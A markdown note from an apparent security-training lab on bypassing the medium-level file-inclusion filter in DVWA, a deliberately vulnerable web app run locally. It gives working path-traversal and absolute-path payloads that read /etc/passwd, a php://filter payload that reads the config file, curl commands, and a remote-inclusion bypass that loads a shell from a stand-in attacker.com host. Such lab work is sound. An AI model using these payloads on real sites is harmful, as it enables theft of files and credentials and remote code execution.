# DVWA File Inclusion — Medium Security

## URL
http://127.0.0.1:4280/vulnerabilities/fi/?page=include.php

## Source Code Behavior (Medium)
- Removes `http://` and `https://` from input (blocks basic RFI)
- Removes `../` and `..\` from input (blocks basic path traversal)
- Uses `str_replace()` — single pass, case-sensitive

## Key Differences from Low
1. `http://` and `https://` stripped — basic RFI blocked
2. `../` stripped — basic path traversal blocked
3. Both filters are single-pass and bypassable

## Bypass Techniques

### Double traversal (nested bypass)
`str_replace` removes `../` once, so nesting reconstructs it:
```
..././ → after removing ../ from middle → ../
....//....// → ../
```

### Working path traversal payloads
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=..././..././..././..././etc/passwd
```

### Absolute path (no traversal needed)
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=/etc/passwd
```
Note: `str_replace` only removes `../` — absolute paths are NOT affected

### RFI bypass with protocol variation
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=hthttp://tp://attacker.com/shell.php
```
After `http://` is removed from the middle: `http://attacker.com/shell.php`

### PHP wrappers (not filtered)
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php
```
Wait — `../` in path gets stripped. Use absolute path instead:
```
http://127.0.0.1:4280/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/var/www/html/dvwa/config/config.inc.php
```

## Step-by-Step Exploitation
1. Try `?page=../../../etc/passwd` — fails (../ stripped)
2. Try `?page=/etc/passwd` — works! Absolute path not filtered
3. Try `?page=..././..././..././etc/passwd` — works (nested bypass)
4. Use PHP filter with absolute path for source code reading

## curl Commands
```bash
# Absolute path bypass
curl -v "http://127.0.0.1:4280/vulnerabilities/fi/?page=/etc/passwd" \
  -b "PHPSESSID=<session>;security=medium"

# Nested traversal bypass
curl -v "http://127.0.0.1:4280/vulnerabilities/fi/?page=..././..././..././..././etc/passwd" \
  -b "PHPSESSID=<session>;security=medium"
```

## Notes
- `str_replace` is single-pass — nested payloads bypass it trivially
- Absolute paths are completely unaffected by the filter
- Case-sensitive: `HTTP://` might also bypass the `http://` filter
